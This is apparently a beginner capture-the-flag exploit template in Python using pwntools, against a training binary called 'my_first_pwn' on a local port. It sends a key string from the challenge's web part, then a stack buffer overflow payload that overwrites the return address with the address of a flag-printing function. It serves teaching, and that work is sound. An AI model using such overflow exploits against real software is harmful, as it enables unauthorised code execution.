from pwn import *

#FILL OUT THIS PART
buffer_size = 16
addr_of_printflag_function = 0x0000000000400647
secret_key_string = "if-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678"

#uncomment this line if you would like to test locally
#p = process("./my_first_pwn")
#uncomment this line if you would like to run the script against the remote binary and get the flag
p = remote("localhost", 31309)

#let's recieve the first bytes from the binary and print them out
print(p.recv())

#hmm they want the secret key from the web part of this challenge
print("sending the key string: " + secret_key_string)
p.send(secret_key_string)
print("response: " + p.recv().decode())

#fill the buffer with As (or any other random character)
payload = b'A' * buffer_size

#overflow the saved_ebp as well
payload += b'B' * 8 

#now we can overwrite the return addr of main
payload += p64(addr_of_printflag_function)

#send the payload
print(b"payload: " + payload)
p.send(payload)

#print the response
print(p.recv())
